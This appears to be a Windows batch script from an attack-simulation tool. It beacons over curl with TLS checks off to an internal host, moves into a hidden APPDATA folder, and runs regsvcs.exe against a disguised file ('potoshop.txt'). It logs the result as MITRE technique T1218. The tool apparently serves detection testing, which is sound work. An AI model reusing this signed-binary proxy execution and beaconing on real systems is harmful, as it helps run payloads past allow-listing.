@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET fkgtx=%APPDATA%\10009\f3900fc8
SET yjyfq=https://10.0.0.49
SET dwyrh=https://10.0.0.49/stage/2/icon.png?10009-10
SET jnfdk=ITZEL-S2B
SET vwekp=10
SET hqmfw=potoshop.txt
SET nqsxt=10009
SET tsvar=!DATE!/!TIME!
SET olywq=%APPDATA%\!vwekp!\macula-simulations.log

echo [!tsvar!][DEBUG][!jnfdk!][!nqsxt!]: heartbeat_start>> "!olywq!" 2>nul
curl -k -s -o nul "!dwyrh!"
echo [!tsvar!][DEBUG][!jnfdk!][!nqsxt!]: heartbeat_complete>> "!olywq!" 2>nul

echo [!tsvar!][DEBUG][!jnfdk!][!nqsxt!]: chdir_start>> "!olywq!" 2>nul
cd /d "!fkgtx!" >nul 2>&1
if errorlevel 1 (SET rezult=0&SET erdtl=dir_not_found) else (SET rezult=1&SET erdtl=)
echo [!tsvar!][DEBUG][!jnfdk!][!nqsxt!]: chdir_result=!errorlevel!>> "!olywq!" 2>nul

echo [!tsvar!][DEBUG][!jnfdk!][!nqsxt!]: regsvcs_start>> "!olywq!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe /U "!hqmfw!" >NUL 2>&1
if !errorlevel! neq 0 (SET rezult=0&SET erdtl=exit_!errorlevel!) else (SET rezult=1&SET erdtl=)

for /f "tokens=1-3 delims=/-" %%a in ("!DATE!") do (set yyyy=%%c& set mm=%%b& set dd=%%a)
set hh=!TIME:~0,2!&set mi=!TIME:~3,2!&set ss=!TIME:~6,2!&set ms=!TIME:~9,3!
echo [20!yyyy!-!mm!-!dd! !hh!:!mi!:!ss!.!ms!][TTP][!jnfdk!][!nqsxt!]: T1218|Signed Binary Proxy Execution (regsvcs.exe)=!rezult!:!erdtl!>> "!olywq!" 2>nul
echo [!tsvar!][DEBUG][!jnfdk!][!nqsxt!]: regsvcs_result=!errorlevel!>> "!olywq!" 2>nul